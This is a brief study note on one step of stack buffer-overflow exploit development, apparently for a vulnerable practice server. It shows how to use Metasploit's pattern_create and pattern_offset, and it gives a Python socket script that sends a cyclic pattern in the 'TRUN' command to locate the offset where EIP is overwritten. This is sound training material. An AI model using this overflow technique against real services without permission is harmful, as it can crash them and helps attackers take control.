# Finding the offset

Finding the point where EIP is overwritten

- metaploit framework → pattern_create

```python
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

- 3000 → number of bytes before overflowing
- modify [fuzz.py](http://fuzz.py)

```python
#!/usr/bin/python
import sys, socket 

offset = "<output obtained from pattern_create>"

try: 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('<windows_ip>', 9999))
	s.send(('TRUN /.:/' + offset))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()
```

- make it executable and execute it
- value of EIP → Immunity Debugger

```python
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP VALUE>
```

- prints the OFFSET